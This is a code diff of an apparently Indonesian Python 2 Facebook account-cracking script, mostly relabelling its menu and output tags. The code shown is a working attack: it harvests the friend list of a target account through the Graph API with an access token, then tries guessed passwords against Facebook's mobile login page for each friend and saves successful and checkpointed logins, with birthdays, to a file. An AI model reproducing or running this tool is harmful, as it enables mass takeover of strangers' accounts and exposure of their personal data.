@@ -154,27 +154,27 @@ def menu():
 	except requests.exceptions.ConnectionError:
 		print(' [!] check your Internet connection ')
 	print(raka_logo)
-	print ' [%s-%s] facebook user : %s'%(ml,ra,nama)
-	print ' [%s-%s] ip user : %s'%(ml,ra,ip)
-	print ' [%s-%s] id user : %s\n'%(ml,ra,id)
+	print ' [%s•%s] Nama : %s'%(ml,ra,nama)
+	print ' [%s•%s] Ip   : %s'%(ml,ra,ip)
+	print ' [%s•%s] Id   : %s\n'%(ml,ra,id)
 	print ' [%s1%s] Start crack '%(hj,ra)
 	print ' [%s2%s] Delete token '%(ku,ra)
 	print ' [%s0%s] logout\n '%(m,ra)
-	asw = raw_input(' [?] Choose : ')
+	asw = raw_input(' [•] Choose : ')
 	if asw =='1' or asw =='01':
 		crack()
 	elif asw =='2' or asw =='02':
-		jalan(' [!] delete token....');time.sleep(1)
+		jalan(' [•] delete token....');time.sleep(1)
 		os.system('rm -rf login_r.txt')
 		login()
 	elif asw =='0':
-		jalan(' [!] please come back ')
+		jalan(' [•] please come back ')
 		os.system('exit')
 	elif asw =='' or asw ==' ':
-		jalan(' [!] please fill in')
+		jalan(' [•] please fill in')
 		menu()
 	else:
-		jalan(' [!] just select whats on the menu ')
+		jalan(' [•] just select whats on the menu ')
 		menu()
 		
 def crack():
@@ -184,21 +184,21 @@ def crack():
 	try:
 		token = open('login_r.txt', 'r').read()
 	except IOError:
-		print' [!] invalid token '
+		print' [•] invalid token '
 		tokenz()
-	ra_id = raw_input(" [\x1b[101m\x1b[1;97m?\x1b[0m] ID Public : ")
+	ra_id = raw_input(" [\x1b[101m\x1b[1;97m•\x1b[0m] ID Public : ")
 	try:
 		pok = requests.get("https://graph.facebook.com/"+ra_id+"?access_token="+token)
 		sp = json.loads(pok.text)
 	except KeyError:
-		jalan(' [!] Id not found ')
+		jalan(' [•] Id not found ')
 	r = requests.get("https://graph.facebook.com/"+ra_id+"/friends?access_token="+token)
 	z = json.loads(r.text)
 	for i in z["data"]:
 		rax_x = i['id']
 		name = i['name']
 		id.append(rax_x+'<=>'+name)
-	print(" [\x1b[101m\x1b[1;97m-\x1b[0m] Total ID  : "+str(len(id)))
+	print(" [\x1b[101m\x1b[1;97m•\x1b[0m] Total ID  : "+str(len(id)))
 	print(garis)
 	print ' \t\t\x1b[1;101m\x1b[1;97mCTRL + Z FOR STOP\x1b[0m'
 	print(garis)
@@ -232,9 +232,9 @@ def crack():
 				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': rax_x, 'pass': pw, 'login': 'submit'}, headers={'user-agent': rafi_ua})
 				xo = rex.content
 				if 'mbasic_logout_button' in xo or 'save-device' in xo:
-					print('\r  ==-[ ' +rax_x+ '|' + pw + '       ',']-==')
+					print('\r  \x1b[1;92m[RAKA_AMANDA] ' +rax_x+ '|' + pw + '       ',']-==')
 					ok.append(rax_x+'|'+pw)
-					save.write('  [ OK ] '+str(rax_x)+'|'+str(pw)+'\n')
+					save.write('  [RAKA_AMANDA] '+str(rax_x)+'|'+str(pw)+'\n')
 					save.close()
 					break
 					continue
@@ -245,17 +245,17 @@ def crack():
 						data = s.get(url).json()
 						tgllhr = data['birthday'].replace("/","-")
 						nama = data['name']
-						print('\r  \x1b[1;96m[ CP ] ' +rax_x+ ' <-> ' + pw + ' <-> ' + tgllhr)
-						cp.append(rax_x+' <-> '+pw+' <-> '+tgllhr)
-						save.write('  [ CP ] '+str(rax_x)+' <-> '+str(pw)+' <-> '+tgllhr+'\n')
+						print('\r  \x1b[1;96m[RAKA_AMANDA] ' +rax_x+ '|' + pw + '|' + tgllhr)
+						cp.append(rax_x+'|'+pw+'|'+tgllhr)
+						save.write('  [RAKA_AMANDA] '+str(rax_x)+'|'+str(pw)+'|'+tgllhr+'\n')
 						save.close()
 						break
 					except(KeyError, IOError):
 						tgllhr = " "
 					except:pass
-					print('\r  \x1b[1;96m [ CP ] ' +rax_x+ ' <-> ' + pw + '       ')
+					print('\r  \x1b[1;96m[RAKA_AMANDA] ' +rax_x+ '|' + pw + '|' + tgllhr)
 					cp.append(rax_x+'|'+pw)
-					save.write('  [ CP ] '+str(rax_x)+' <-> '+str(pw)+'\n')
+					save.write('  [RAKA_AMANDA] '+str(rax_x)+'|'+str(pw)+'|'+tgllhr+'\n')
 					save.close()
 					break
 					continue
@@ -270,7 +270,7 @@ def crack():
 if __name__ == '__main__':
 	#os.system('clear')
 	#print(raka_logo)
-	#user = raw_input(' [\x1b[101m\x1b[1;97m?\x1b[0m] siapa nama anda : ')
+	#user = raw_input(' [\x1b[101m\x1b[1;97m•\x1b[0m] siapa nama anda : ')
 	#print# ' hello : %s'#%(user)
 	#lock()
 	login()
